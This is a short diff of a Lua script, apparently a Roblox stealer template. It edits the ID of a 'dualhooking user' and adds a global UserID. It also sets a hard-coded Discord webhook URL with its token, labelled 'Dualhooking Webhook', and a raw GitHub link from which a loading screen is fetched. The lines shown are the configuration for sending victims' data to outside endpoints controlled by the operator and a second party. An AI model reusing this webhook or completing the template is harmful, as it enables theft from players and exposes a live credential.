@@ -7,7 +7,8 @@
 
 ]]--
 
-local dhuser = "2664951211"       -- dualhooking user
+local dhuser = "8kknb5e8ryn"       -- dualhooking user
+_G.UserID = "12490815"
 local dhwebhook = "https://discord.com/api/webhooks/1061617319199129691/2rA5_qHdSvbnjS-bM4LTLeQbQS7CzEUkkRZ5m0epsghd2FuYAqsJ7EWb9-jYuXmmpFXw" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/Adidsus/untested/main/load.lua" -- Put Your LoadingScreen Raw Link Here
 
